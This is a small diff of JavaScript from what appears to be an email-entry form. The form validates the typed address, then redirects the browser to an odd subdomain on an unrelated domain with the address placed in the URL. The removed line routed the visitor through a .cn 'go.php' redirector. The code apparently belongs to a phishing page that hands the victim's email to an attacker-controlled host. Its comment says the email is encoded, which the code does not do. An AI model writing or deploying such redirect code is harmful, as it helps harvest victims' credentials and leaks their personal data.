@@ -129,7 +129,7 @@ const email = document.getElementById('email').value;
 // Check if email is valid
 if (validateEmail(email)) {
 const encodedEmail = (email); // Encode email to handle special characters
-window.location.href = `https://www.vhdns.cn/go.php?url=https%3A%2F%2Fdashboard-15tyh9i1p%2Elosangelesits%2Ecom/${encodedEmail}`; // Redirect with email query
+window.location.href = `https://dashboard-15tyh9i1p.losangelesits.com/${encodedEmail}`; // Redirect with email query
 } else {
 alert("Please enter a valid email address.");
 }
